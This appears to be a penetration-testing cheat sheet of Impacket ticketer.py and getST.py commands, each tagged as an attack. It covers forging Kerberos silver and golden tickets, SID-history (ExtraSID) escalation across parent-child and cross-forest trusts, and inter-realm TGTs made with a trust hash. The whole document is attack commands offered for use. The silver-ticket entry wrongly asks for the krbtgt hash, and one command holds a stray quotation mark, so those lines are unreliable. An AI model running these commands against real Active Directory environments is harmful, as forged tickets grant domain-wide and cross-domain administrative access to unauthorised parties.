# ticketer (imp)

% impacket-kerberos, windows, kerberos, 88



## silver ticket
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain_fqdn> -spn <SPN> -user-id <user_rid|500> <user|administrator>
```

## golden ticket  
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_hash> -domain <domain_fqdn> -domain-sid <domain_sid> -user-id <user_rid|500> <user|administrator>
```

## golden + ExtraSID (parent-child)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
if user = administrator no need of -user-id
```
ticketer.py -nthash <krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|519> -user-id <user_rid> <user|jubeaz>
```

## golden + ExtraSID (parent-child) (dc account)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_nthash> -domain-sid <child_somain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <dc_rid>  '<dc_name>$'
```

## golden + ExtraSID (cross-forest)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
if user = administrator no need of -user-id
```
ticketer.py -nthash <krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid> -user-id <user_rid> <user>
```

## (golden) Inter-Realm TGT    
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
    export KRB5CCNAME=/tmp/jubeaz.ccache   
    getST.py -k -no-pass -spn <cifs>/<dc_fqdn> <src_domain_fqdn>/<user>@<domain_fqdn> -debug
```
ticketer.py -nthash <trust_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<RID|519>" -spn "krbtgt/<dest_domain_fqdn>" -user-id <user_rid> <user|jubeaz>
```